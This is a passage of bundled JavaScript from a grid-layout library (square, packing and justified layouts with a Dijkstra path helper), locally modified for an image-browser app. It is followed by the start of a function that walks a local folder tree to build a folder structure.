		// if outlines' length and columns' length are now same, re-caculate outlines.
		var startOutline = void 0;

		if (outline.length !== this._columnLength) {
			var pos = outline.length === 0 ? 0 : Math.min.apply(Math, outline);

			// re-layout items.
			startOutline = (0, _utils.fill)(new Array(this._columnLength), pos);
		} else {
			startOutline = outline.slice();
		}
		groups.forEach(function (group) {
			var items = group.items;
			var result = _this._layout(items, startOutline, _consts.APPEND);

			group.outlines = result;
			startOutline = result.end;
		});

		return this;
	};

	GridLayout.prototype.setSize = function setSize(size) {
		this._size = size;
		return this;
	};

	return GridLayout;
}();

exports["default"] = GridLayout;
module.exports = exports["default"];

/***/ }),
/* 13 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _FrameLayout2 = __webpack_require__(6);

var _FrameLayout3 = _interopRequireDefault(_FrameLayout2);

var _utils = __webpack_require__(0);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

function makeShapeOutline(outline, itemSize, columnLength, isAppend) {
	var point = Math[isAppend ? "min" : "max"].apply(Math, outline) || 0;

	if (outline.length !== columnLength) {
		return (0, _utils.fill)(new Array(columnLength), 0);
	}
	return outline.map(function (l) {
		return parseInt((l - point) / itemSize, 10);
	});
}
function getColumn(item) {
	if (item.column) {
		return item.column;
	}
	var column = 0;

	if (item.el) {
		var dataset = item.el.dataset;

		if (dataset) {
			column = dataset.column || 1;
		} else {
			column = item.el.getAttribute("column") || 1;
		}
	} else {
		column = 1;
	}
	item.column = column;
	return column;
}

var SquareLayout = function (_FrameLayout) {
	_inherits(SquareLayout, _FrameLayout);

	function SquareLayout() {
		_classCallCheck(this, SquareLayout);

		return _possibleConstructorReturn(this, _FrameLayout.apply(this, arguments));
	}

	SquareLayout.prototype._checkItemSize = function _checkItemSize() {
		var column = this.options.column;

		if (!column) {
			_FrameLayout.prototype._checkItemSize.call(this);
			return;
		}
		var margin = this.options.margin;

		// if itemSize is not in options, caculate itemSize from size.
		this._itemSize = (this._size + margin) / column - margin;
	};

	SquareLayout.prototype._layout = function _layout(items) {
		var _shapes;

		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];
		var isAppend = arguments[2];

		var itemSize = this._getItemSize();
		var margin = this.options.margin;
		var columnLength = this.options.column || parseInt((this._size + margin) / (itemSize + margin), 10) || 1;
		var length = items.length;
		var endOutline = makeShapeOutline(outline, itemSize, columnLength, isAppend);
		var pointCaculateName = isAppend ? "min" : "max";
		var shapes = [];
		var sign = isAppend ? 1 : -1;
		var style = this._style;
		var pos1Name = style.pos1;
		var pos2Name = style.pos2;

		for (var i = 0; i < length; ++i) {
			var _shapes$push;

			var point = Math[pointCaculateName].apply(Math, endOutline);
			var index = endOutline[isAppend ? "indexOf" : "lastIndexOf"](point);
			var item = items[i];
			var columnWidth = item.columnWidth;
			var column = columnWidth && columnWidth[0] === columnLength && columnWidth[1] || getColumn(item);
			var columnCount = 1;

			if (column > 1) {
				for (var j = 1; j < column && (isAppend && index + j < columnLength || !isAppend && index - j >= 0); ++j) {
					if (isAppend && endOutline[index + sign * j] <= point || !isAppend && endOutline[index + sign * j] >= point) {
						++columnCount;
						continue;
					}
					break;
				}
				if (!isAppend) {
					index -= columnCount - 1;
				}
			}
			item.columnWidth = [columnLength, columnCount];
			shapes.push((_shapes$push = {
				width: columnCount,
				height: columnCount
			}, _shapes$push[pos1Name] = point - (!isAppend ? columnCount : 0), _shapes$push[pos2Name] = index, _shapes$push.index = i, _shapes$push));
			for (var _j = 0; _j < columnCount; ++_j) {
				endOutline[index + _j] = point + sign * columnCount;
			}
		}
		this._shapes = (_shapes = {
			shapes: shapes
		}, _shapes[style.size2] = columnLength, _shapes);

		var result = _FrameLayout.prototype._layout.call(this, items, outline, isAppend);

		if (!isAppend) {
			var lastItem = items[items.length - 1];

			shapes.sort(function (shape1, shape2) {
				var item1pos1 = shape1[pos1Name];
				var item1pos2 = shape1[pos2Name];
				var item2pos1 = shape2[pos1Name];
				var item2pos2 = shape2[pos2Name];

				if (item1pos1 - item2pos1) {
					return item1pos1 - item2pos1;
				}
				return item1pos2 - item2pos2;
			});
			items.sort(function (a, b) {
				var item1pos1 = a.rect[pos1Name];
				var item1pos2 = a.rect[pos2Name];
				var item2pos1 = b.rect[pos1Name];
				var item2pos2 = b.rect[pos2Name];

				if (item1pos1 - item2pos1) {
					return item1pos1 - item2pos1;
				}
				return item1pos2 - item2pos2;
			});
			result.startIndex = 0;
			result.endIndex = items.indexOf(lastItem);
		}
		return result;
	};

	return SquareLayout;
}(_FrameLayout3["default"]);

exports["default"] = SquareLayout;
module.exports = exports["default"];

/***/ }),
/* 14 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _BoxModel = __webpack_require__(15);

var _BoxModel2 = _interopRequireDefault(_BoxModel);

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function getCost(originLength, length) {
	var cost = originLength / length;

	if (cost < 1) {
		cost = 1 / cost;
	}

	return cost - 1;
}
function fitArea(item, bestFitArea, itemFitSize, containerFitSize, layoutVertical) {
	item.setHeight(itemFitSize.height);
	item.setWidth(itemFitSize.width);
	bestFitArea.setHeight(containerFitSize.height);
	bestFitArea.setWidth(containerFitSize.width);

	if (layoutVertical) {
		item.setTop(bestFitArea.getTop() + bestFitArea.getHeight());
		item.setLeft(bestFitArea.getLeft());
	} else {
		item.setLeft(bestFitArea.getLeft() + bestFitArea.getWidth());
		item.setTop(bestFitArea.getTop());
	}
}

var PackingLayout = function () {
	function PackingLayout() {
		var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

		_classCallCheck(this, PackingLayout);

		this.options = (0, _utils.assignOptions)({
			aspectRatio: 1,
			sizeWeight: 1,
			ratioWeight: 1
		}, options);
		this._size = 0;
		this._style = (0, _utils.getStyleNames)(this.options.horizontal);
	}

	PackingLayout.prototype._findBestFitArea = function _findBestFitArea(container, item) {
		if (container.getRatio() === 0) {
			// 아이템 최초 삽입시 전체영역 지정
			container.setOriginWidth(item.getWidth());
			container.setOriginHeight(item.getHeight());
			container.setWidth(item.getWidth());
			container.setHeight(item.getHeight());
			return;
		}

		var bestFitArea = null;
		var minCost = 10000000;
		var layoutVertical = false;
		var itemFitSize = {
			width: 0,
			height: 0
		};
		var containerFitSize = {
			width: 0,
			height: 0
		};
		var _options = this.options,
		    sizeWeight = _options.sizeWeight,
		    ratioWeight = _options.ratioWeight;


		container.innerItem().forEach(function (v) {
			var containerSizeCost = getCost(v.getOriginSize(), v.getSize()) * sizeWeight;
			var containerRatioCost = getCost(v.getOriginRatio(), v.getRatio()) * ratioWeight;
			var cost = void 0;

			for (var i = 0; i < 2; ++i) {
				var itemWidth = void 0;
				var itemHeight = void 0;
				var containerWidth = void 0;
				var containerHeight = void 0;

				if (i === 0) {
					// 상하에 아이템 추가
					itemWidth = v.getWidth();
					itemHeight = v.getHeight() * (item.getHeight() / (v.getOriginHeight() + item.getHeight()));
					containerWidth = v.getWidth();
					containerHeight = v.getHeight() - itemHeight;
				} else {
					// 좌우에 아이템 추가
					itemHeight = v.getHeight();
					itemWidth = v.getWidth() * (item.getWidth() / (v.getOriginWidth() + item.getWidth()));
					containerHeight = v.getHeight();
					containerWidth = v.getWidth() - itemWidth;
				}

				var itemSize = itemWidth * itemHeight;
				var itemRatio = itemWidth / itemHeight;
				var containerSize = containerWidth * containerHeight;
				var containerRatio = containerHeight / containerHeight;

				cost = getCost(item.getSize(), itemSize) * sizeWeight;
				cost += getCost(item.getRatio(), itemRatio) * ratioWeight;
				cost += getCost(v.getOriginSize(), containerSize) * sizeWeight - containerSizeCost;
				cost += getCost(v.getOriginRatio(), containerRatio) * ratioWeight - containerRatioCost;

				if (cost === Math.min(cost, minCost)) {
					minCost = cost;
					bestFitArea = v;
					layoutVertical = i === 0;
					itemFitSize.width = itemWidth;
					itemFitSize.height = itemHeight;
					containerFitSize.width = containerWidth;
					containerFitSize.height = containerHeight;
				}
			}
		});

		fitArea(item, bestFitArea, itemFitSize, containerFitSize, layoutVertical);
	};

	PackingLayout.prototype._layout = function _layout(items) {
		var _this = this;

		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];
		var isAppend = arguments[2];

		var style = this._style;
		var isHorizontal = this.options.horizontal;
		var aspectRatio = this.options.aspectRatio;
		var margin = this.options.margin;
		var pos1Name = style.pos1;
		var size1Name = style.size1;
		var containerWidth = this._size * (isHorizontal ? aspectRatio : 1);
		var containerHeight = this._size / (isHorizontal ? 1 : aspectRatio);
		var containerSize1 = isHorizontal ? containerWidth : containerHeight;
		var prevOutline = (0, _utils.toZeroArray)(outline);
		var start = isAppend ? Math.max.apply(Math, prevOutline) : Math.min.apply(Math, prevOutline) - containerSize1 - margin;
		var end = start + containerSize1 + margin;
		var container = new _BoxModel2["default"]({});

		var startIndex = -1;
		var endIndex = -1;
		var startPos = -1;
		var endPos = -1;

		items.forEach(function (item) {
			var model = new _BoxModel2["default"]({
				originWidth: item.orgSize.width,
				originHeight: item.orgSize.height,
				width: item.orgSize.width,
				height: item.orgSize.height
			});

			_this._findBestFitArea(container, model);
			container.pushItem(model);
			container.scaleTo(containerWidth + margin, containerHeight + margin);
		});
		items.forEach(function (item, i) {
			var boxItem = container.innerItem()[i];
			// console.log("boxItem", boxItem, boxItem instanceof BoxModel);
			var width = boxItem.getWidth();
			var height = boxItem.getHeight();
			var top = boxItem.getTop();
			var left = boxItem.getLeft();

			item.rect = { top: top, left: left, width: width - margin, height: height - margin };
			item.rect[pos1Name] += start;

			if (startIndex === -1) {
				startIndex = i;
				endIndex = i;
				startPos = item.rect[pos1Name];
				endPos = startPos;
			}
			if (startPos > item.rect[pos1Name]) {
				startPos = item.rect[pos1Name];
				startIndex = i;
			}
			if (endPos < item.rect[pos1Name] + item.rect[size1Name] + margin) {
				endPos = item.rect[pos1Name] + item.rect[size1Name] + margin;
				endIndex = i;
			}
		});

		return {
			start: [start],
			end: [end],
			startIndex: startIndex,
			endIndex: endIndex
		};
	};

	PackingLayout.prototype._insert = function _insert() {
		var items = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];
		var type = arguments[2];

		// this only needs the size of the item.
		var clone = items.map(function (item) {
			return _extends({}, item);
		});

		return {
			items: clone,
			outlines: this._layout(clone, outline, type)
		};
	};

	PackingLayout.prototype.append = function append(items, outline) {
		return this._insert(items, outline, _consts.APPEND);
	};

	PackingLayout.prototype.prepend = function prepend(items, outline) {
		return this._insert(items, outline, _consts.PREPEND);
	};

	PackingLayout.prototype.layout = function layout() {
		var groups = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];

		var length = groups.length;
		var point = outline;

		for (var i = 0; i < length; ++i) {
			var group = groups[i];

			point = this._layout(group.items, point, _consts.APPEND);
			group.outlines = point;
			point = point.end;
		}
		return this;
	};

	PackingLayout.prototype.setSize = function setSize(size) {
		this._size = size;
		return this;
	};

	return PackingLayout;
}();

exports["default"] = PackingLayout;
module.exports = exports["default"];

/***/ }),
/* 15 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var BoxModel = function () {
	function BoxModel(option) {
		_classCallCheck(this, BoxModel);

		this._originWidth = option.originWidth || 0;
		this._originHeight = option.originHeight || 0;
		this._width = option.width || 0;
		this._height = option.height || 0;
		this._left = option.left || 0;
		this._top = option.top || 0;
		this._item = option.item;
		this._innerItem = option.innerItem || [];
	}

	BoxModel.prototype.getOriginWidth = function getOriginWidth() {
		return this._originWidth;
	};

	BoxModel.prototype.setOriginWidth = function setOriginWidth(width) {
		this._originWidth = width;
	};

	BoxModel.prototype.getOriginHeight = function getOriginHeight() {
		return this._originHeight;
	};

	BoxModel.prototype.setOriginHeight = function setOriginHeight(height) {
		this._originHeight = height;
	};

	BoxModel.prototype.getWidth = function getWidth() {
		return this._width;
	};

	BoxModel.prototype.setWidth = function setWidth(width) {
		this._width = width;
	};

	BoxModel.prototype.getHeight = function getHeight() {
		return this._height;
	};

	BoxModel.prototype.setHeight = function setHeight(height) {
		this._height = height;
	};

	BoxModel.prototype.getLeft = function getLeft() {
		return this._left;
	};

	BoxModel.prototype.setLeft = function setLeft(left) {
		this._left = left;
	};

	BoxModel.prototype.getTop = function getTop() {
		return this._top;
	};

	BoxModel.prototype.setTop = function setTop(top) {
		this._top = top;
	};

	BoxModel.prototype.innerItem = function innerItem() {
		return this._innerItem;
	};

	BoxModel.prototype.scaleTo = function scaleTo(width, height) {
		var scaleX = this._width === 0 ? 0 : width / this._width;
		var scaleY = this._height === 0 ? 0 : height / this._height;

		this._innerItem.forEach(function (v) {
			if (scaleX !== 0) {
				v._left *= scaleX;
				v._width *= scaleX;
			}
			if (scaleY !== 0) {
				v._top *= scaleY;
				v._height *= scaleY;
			}
		});

		this._width = width;
		this._height = height;
	};

	BoxModel.prototype.pushItem = function pushItem(item) {
		this._innerItem.push(item);
	};

	BoxModel.prototype.getOriginSize = function getOriginSize() {
		return this._originWidth * this._originHeight;
	};

	BoxModel.prototype.getSize = function getSize() {
		return this._width * this._height;
	};

	BoxModel.prototype.getOriginRatio = function getOriginRatio() {
		return this._originHeight === 0 ? 0 : this._originWidth / this._originHeight;
	};

	BoxModel.prototype.getRatio = function getRatio() {
		return this._height === 0 ? 0 : this._width / this._height;
	};

	BoxModel.prototype.isSmallerThen = function isSmallerThen(box) {
		return this._width <= box._width && this._height <= box._height;
	};

	BoxModel.prototype.isEqual = function isEqual(box) {
		return this._left === box._left && this._top === box._top && this._width === box._width && this._height === box._height;
	};

	return BoxModel;
}();

module.exports = BoxModel;

/***/ }),
/* 16 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var _dijkstra = __webpack_require__(17);

var _dijkstra2 = _interopRequireDefault(_dijkstra);

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var JustifiedLayout = function () {
	function JustifiedLayout() {
		var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

		_classCallCheck(this, JustifiedLayout);

		this.options = (0, _utils.assignOptions)({
			minSize: 0,
			maxSize: 0,
			column: [1, 16]
		}, options);

		this._style = (0, _utils.getStyleNames)(this.options.horizontal);
		this._size = 0;
	}

	JustifiedLayout.prototype._layout = function _layout(items, outline, isAppend) {
		var _this = this;

		var style = this._style;
		var size1Name = style.size1;
		var size2Name = style.size2;
		var startIndex = 0;
		var endIndex = items.length;
		var column = this.options.column;

		var maxSize = this.options.maxSize;
		var minSize = this.options.minSize;
		var containerWidth = ig._layout._size || $("#box-container .box-list").width();
		var maxColumn = Math.ceil(containerWidth / minSize);
		// Note: 如果 maxColumn = 0，將會導致 Error: Could not find a path from node0 to node14
		if (maxColumn === 0) { maxColumn = parseInt(window.innerWidth / minSize); }
		// var allData = angular.element("body").scope().allData;

		if ((typeof column === "undefined" ? "undefined" : _typeof(column)) !== "object") {
			column = [column, column];
		}

		var graph = function graph(_start) {
			var results = {};
			var start = +_start.replace(/[^0-9]/g, "");
			var length = endIndex + 1;
			var itemsLength = length;

			for (var i = Math.min(start + column[0], length - 1); i < length; ++i) {

				// Note: 如果想要避免一排出現太多元素造成元素高度太低，可以提前 break
				// [修正] 自適應佈局在列表文件數量較少時，會出現莫名的換行
				if (i - start >= maxColumn + 1 && items.length >= 20) {
					break;
				}

				if (i - start >= column[1]) {
					break;
				}
				
				var cost = _this._getCost(items, start, i, size1Name, size2Name, itemsLength);

				// if (cost < 0 && i === length - 1) {
				// 	cost = 0;
				// }

				if (cost !== null) {
					results["node" + i] = Math.pow(cost, 2);
				}
			}
			return results;
		};
		// shortest path for items' total height.
		var path = _dijkstra2["default"].find_path(graph, "node" + startIndex, "node" + endIndex);

		return this._setStyle(items, path, outline, isAppend);
	};

	JustifiedLayout.prototype._getSize = function _getSize(items, size1Name, size2Name, itemsLength) {
		// console.log(itemsLength)
		var margin = this.options.margin;
		var size = items.reduce(function (sum, item) {
			return sum + item.size[size2Name] / item.size[size1Name];
		}, 0);

		var length = items.length;
		var result = (this._size - margin * (length - 1)) / size;
		// var maxSize = this.options.maxSize;
		// var minSize = this.options.minSize;
		// var size = parseInt($("#box-container").width() / maxSize) * maxSize;
		// var maxColumn = Math.floor( / minSize);
		var allData = $bodyScope.allData;
		if (result >= size && itemsLength < 5 && allData && allData.length < 5) {
		// if (result >= size && itemsLength < 6) {
			// debugger
			return Math.min(ig._layout.options.minSize, result);
		}
		else {
			return result;
		}
	};

	JustifiedLayout.prototype._getCost = function _getCost(items, i, j, size1Name, size2Name, itemsLength) {
		var size = this._getSize(items.slice(i, j), size1Name, size2Name, itemsLength);
		var min = this.options.minSize || 0;
		var max = this.options.maxSize || Infinity;

		if (isFinite(max)) {
			// if this size is not in range, the cost increases sharply.
			// if (size < min) {
			// 	return Math.pow(size - min, 2) + Math.pow(max, 2);
			// }
			// else if (size > max) {
			// 	return Math.pow(size - max, 2) + Math.pow(max, 2);
			// }
			// else {
				// if this size in range, the cost is negative or low.
				return Math.min(size - max, min - size);
			// }
		}
		// if max is infinite type, caculate cost only with "min".
		if (size < min) {
			return Math.max(Math.pow(min, 2), Math.pow(size, 2));
		}
		return size - min;
	};

	JustifiedLayout.prototype._setStyle = function _setStyle(items, path) {

		var outline = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : [];
		var isAppend = arguments[3];

		var style = this._style;
		// if direction is vertical
		// pos1 : top, pos11 : bottom
		// size1 : height
		// pos2 : left, pos22 : right
		// size2 : width

		// if direction is horizontal
		// pos1 : left, pos11 : right
		// size1 : width
		// pos2 : top, pos22 : bottom
		// size2 : height
		var pos1Name = style.pos1;
		var size1Name = style.size1;
		var pos2Name = style.pos2;
		var size2Name = style.size2;
		var length = path.length;
		var margin = this.options.margin;
		var startPoint = outline[0] || 0;
		var endPoint = startPoint;
		var height = 0;

		var $scope = angular.element("body").scope();
		var isNameVisible = $scope.showName;
		var isMetasVisible = $scope.showMetas;

		var groupKeys = ig.getGroupKeys();

		for (var i = 0; i < length - 1; ++i) {
			var path1 = parseInt(path[i].replace("node", ""), 10);
			var path2 = parseInt(path[i + 1].replace("node", ""), 10);
			// pathItems(path1 to path2) are in 1 line.
			var pathItems = items.slice(path1, path2);
			var pathItemsLength = pathItems.length;
			var size1 = this._getSize(pathItems, size1Name, size2Name, length);	// height
			var pos1 = endPoint;

			// Note: 避免出现超大一张图片，塞满画面
			if (items.length <= 6) {
				var blockWidth = $scope.imageSize.height;
				if (size1 > blockWidth * 1.5) size1 = blockWidth;
			}

			var actuallySize1 = size1;
			if (isNameVisible) { actuallySize1 += 23; }
			if (isMetasVisible) { actuallySize1 += 17; }

			for (var j = 0; j < pathItemsLength; ++j) {
				var _item$rect;

				var item = pathItems[j];
				var isLast = i === length - 2 && item.groupKey === groupKeys[groupKeys.length - 1];
				var size2 = item.size[size2Name] / item.size[size1Name] * size1;
				var minWidth  = this.options.minSize;
				var finalWidth = size2;
				
				// 如果是最後一排資料，則將最後一個元素的寬度設為最小寬度
				if (isLast) {
					finalWidth = Math.min(size2, minWidth * 1.7);
				}

				// item has margin bottom and right.
				// first item has not margin.
				var prevItemRect = j === 0 ? 0 : pathItems[j - 1].rect;
				var pos2 = prevItemRect ? prevItemRect[pos2Name] + prevItemRect[size2Name] + margin : 0;

				item.rect = (_item$rect = {}, _item$rect[pos1Name] = pos1, _item$rect[pos2Name] = pos2, _item$rect[size1Name] = actuallySize1, _item$rect[size2Name] = finalWidth, _item$rect);
			}

			if (isNameVisible) { height += (23 + 16); }
			if (isMetasVisible) { height += 17; }

			height += margin + size1;
			endPoint = startPoint + height;
		}
		var itemsLength = items.length;
		var startIndex = itemsLength ? 0 : -1;
		var endIndex = itemsLength ? itemsLength - 1 : -1;

		if (isAppend) {
			// previous group's end outline is current group's start outline
			return {
				start: [startPoint],
				end: [endPoint],
				startIndex: startIndex,
				endIndex: endIndex
			};
		}
		// for prepend, only substract height from position.
		// always start is lower than end.

		for (var _i = 0; _i < itemsLength; ++_i) {
			var _item = items[_i];

			// move items as long as height for prepend
			_item.rect[pos1Name] -= height;
		}
		return {
			start: [startPoint - height],
			end: [startPoint], // endPoint - height = startPoint
			startIndex: startIndex,
			endIndex: endIndex
		};
	};

	JustifiedLayout.prototype._insert = function _insert(items, outline, type) {
		// this only needs the size of the item.
		var clone = items.map(function (item) {
			return _extends({}, item);
		});

		return {
			items: clone,
			outlines: this._layout(clone, outline, type)
		};
	};

	JustifiedLayout.prototype.setSize = function setSize(size) {
		this._size = size;
		return this;
	};

	JustifiedLayout.prototype.append = function append(items, outline) {
		return this._insert(items, outline, _consts.APPEND);
	};

	JustifiedLayout.prototype.prepend = function prepend(items, outline) {
		return this._insert(items, outline, _consts.PREPEND);
	};

	JustifiedLayout.prototype.layout = function layout(groups, outlines) {
		var length = groups.length;
		var point = outlines;

		for (var i = 0; i < length; ++i) {
			var group = groups[i];

			point = this._layout(group.items, point, _consts.APPEND);
			group.outlines = point;
			point = point.end;
		}
		return this;
	};

	return JustifiedLayout;
}();

exports["default"] = JustifiedLayout;
module.exports = exports["default"];

/***/ }),
/* 17 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

(function () {
  var dijkstra = {
    single_source_shortest_paths: function single_source_shortest_paths(graph, s, d) {
      // Predecessor map for each node that has been encountered.
      // node ID => predecessor node ID
      var predecessors = {};

      // Costs of shortest paths from s to all nodes encountered.
      // node ID => cost
      var costs = {};
      costs[s] = 0;

      // Costs of shortest paths from s to all nodes encountered; differs from
      // `costs` in that it provides easy access to the node that currently has
      // the known shortest path from s.
      // XXX: Do we actually need both `costs` and `open`?
      var open = new BinaryHeap(function (x) {
        return x.cost;
      });
      open.push({ value: s, cost: 0 });

      var closest, u, cost_of_s_to_u, adjacent_nodes, cost_of_e, cost_of_s_to_u_plus_cost_of_e, cost_of_s_to_v, first_visit;
      while (open.size()) {
        // In the nodes remaining in graph that have a known cost from s,
        // find the node, u, that currently has the shortest path from s.
        closest = open.pop();
        u = closest.value;
        cost_of_s_to_u = closest.cost;

        // Get nodes adjacent to u...
        adjacent_nodes = graph(u) || {};

        // ...and explore the edges that connect u to those nodes, updating
        // the cost of the shortest paths to any or all of those nodes as
        // necessary. v is the node across the current edge from u.
        for (var v in adjacent_nodes) {
          // Get the cost of the edge running from u to v.
          cost_of_e = adjacent_nodes[v];

          // Cost of s to u plus the cost of u to v across e--this is *a*
          // cost from s to v that may or may not be less than the current
          // known cost to v.
          cost_of_s_to_u_plus_cost_of_e = cost_of_s_to_u + cost_of_e;

          // If we haven't visited v yet OR if the current known cost from s to
          // v is greater than the new cost we just found (cost of s to u plus
          // cost of u to v across e), update v's cost in the cost list and
          // update v's predecessor in the predecessor list (it's now u).
          cost_of_s_to_v = costs[v];
          first_visit = typeof costs[v] === 'undefined';
          if (first_visit || cost_of_s_to_v > cost_of_s_to_u_plus_cost_of_e) {
            costs[v] = cost_of_s_to_u_plus_cost_of_e;
            open.push({ value: v, cost: cost_of_s_to_u_plus_cost_of_e });
            predecessors[v] = u;
          }
        }
      }

      if (typeof costs[d] === 'undefined') {
        var msg = ['Could not find a path from ', s, ' to ', d, '.'].join('');
        throw new Error(msg);
      }

      return predecessors;
    },

    extract_shortest_path_from_predecessor_list: function extract_shortest_path_from_predecessor_list(predecessors, d) {
      var nodes = [];
      var u = d;
      var predecessor;
      while (u) {
        nodes.push(u);
        predecessor = predecessors[u];
        u = predecessors[u];
      }
      nodes.reverse();
      return nodes;
    },

    find_path: function find_path(graph, s, d) {
      var predecessors = dijkstra.single_source_shortest_paths(graph, s, d);
      return dijkstra.extract_shortest_path_from_predecessor_list(predecessors, d);
    }

  };

  function BinaryHeap(scoreFunction) {
    this.content = [];
    this.scoreFunction = scoreFunction;
  }

  BinaryHeap.prototype = {
    push: function push(element) {
      // Add the new element to the end of the array.
      this.content.push(element);
      // Allow it to bubble up.
      this.bubbleUp(this.content.length - 1);
    },

    pop: function pop() {
      // Store the first element so we can return it later.
      var result = this.content[0];
      // Get the element at the end of the array.
      var end = this.content.pop();
      // If there are any elements left, put the end element at the
      // start, and let it sink down.
      if (this.content.length > 0) {
        this.content[0] = end;
        this.sinkDown(0);
      }
      return result;
    },

    remove: function remove(node) {
      var len = this.content.length;
      // To remove a value, we must search through the array to find
      // it.
      for (var i = 0; i < len; i++) {
        if (this.content[i] === node) {
          // When it is found, the process seen in 'pop' is repeated
          // to fill up the hole.
          var end = this.content.pop();
          if (i !== len - 1) {
            this.content[i] = end;
            if (this.scoreFunction(end) < this.scoreFunction(node)) {
              this.bubbleUp(i);
            } else {
              this.sinkDown(i);
            }
          }
          return;
        }
      }
      throw new Error('Node not found.');
    },

    size: function size() {
      return this.content.length;
    },

    bubbleUp: function bubbleUp(n) {
      // Fetch the element that has to be moved.
      var element = this.content[n];
      // When at 0, an element can not go up any further.
      while (n > 0) {
        // Compute the parent element's index, and fetch it.
        var parentN = Math.floor((n + 1) / 2) - 1,
            parent = this.content[parentN];
        // Swap the elements if the parent is greater.
        if (this.scoreFunction(element) < this.scoreFunction(parent)) {
          this.content[parentN] = element;
          this.content[n] = parent;
          // Update 'n' to continue at the new position.
          n = parentN;
        }
        // Found a parent that is less, no need to move it further.
        else {
            break;
          }
      }
    },

    sinkDown: function sinkDown(n) {
      // Look up the target element and its score.
      var length = this.content.length,
          element = this.content[n],
          elemScore = this.scoreFunction(element);

      while (true) {
        // Compute the indices of the child elements.
        var child2N = (n + 1) * 2,
            child1N = child2N - 1;
        // This is used to store the new position of the element,
        // if any.
        var swap = null;
        // If the first child exists (is inside the array)...
        if (child1N < length) {
          // Look it up and compute its score.
          var child1 = this.content[child1N],
              child1Score = this.scoreFunction(child1);
          // If the score is less than our element's, we need to swap.
          if (child1Score < elemScore) {
            swap = child1N;
          }
        }
        // Do the same checks for the other child.
        if (child2N < length) {
          var child2 = this.content[child2N],
              child2Score = this.scoreFunction(child2);
          if (child2Score < (swap == null ? elemScore : child1Score)) {
            swap = child2N;
          }
        }

        // If the element needs to be moved, swap it, and continue.
        if (swap !== null) {
          this.content[n] = this.content[swap];
          this.content[swap] = element;
          n = swap;
        }
        // Otherwise, we are done.
        else {
            break;
          }
      }
    }
  };

  if (typeof module !== 'undefined' && module.exports) {
    module.exports = dijkstra;
  } else {
    window.dijkstra = dijkstra;
  }
})();

/***/ })
/******/ ]);
});
//# sourceMappingURL=infinitegrid.pkgd.js.map


var getFolderList = function (dir) {
    var tree = walkTreeSync(dir);
    var counter = { depth: 1, files: 0 };
    treeDepth(tree, "folders", 1, counter);
    console.log(counter);
    return {
        tree: tree,
        depth: counter.depth,
        fileCount: counter.files,
    }
}

function createFolderStruture (newTree, tree) {
    var arr;
    var collator = new Intl.Collator("zh-CN", { numeric: true, sensitivity: 'base' } );
    if (Array.isArray(tree)) {
        arr = tree;
    }
    else {
        arr = tree["folders"];
    }
    if (arr && Array.isArray(arr)) {
        arr.forEach(function (node) {
            var newNode = {
                id: node.id,
                name: path.basename(node.dir),
                children: [],
                modificationTime: Date.now(),
                tags: [],
                isExpand: node.depth <= 1,
            };
            newTree.children.push(newNode);
            createFolderStruture(newNode, node);
        });
        newTree.children = newTree.children.sort(function (a, b) {
            return collator.compare(a.name, b.name);
        });
    }
}

var walkTreeSync = function(dir, tree) {

    var path = path || require('path');
    var fs = fs || require('fs'),
        files = fs.readdirSync(dir);

    var tree = tree || {
        id: guid(),
        dir: dir,
        files: [],
        folders: []
    };

    files.forEach(function(file) {
        var filepath = path.join(dir, file);
        try {
            var ext = getExt({path:filepath});
            if (ext) {
                if (!junk.is(file)) {
                    tree.files.push(filepath);
                }
            }
            else {
                if (IS_DIRECTORY.check(filepath) && !filepath.endsWith(".mindnode") && !filepath.endsWith(".key") && !filepath.endsWith(".pxd")) {
                    var folder = {
                        id: guid(),
                        dir: filepath,
                        files: [],
                        folders: [],
                    };
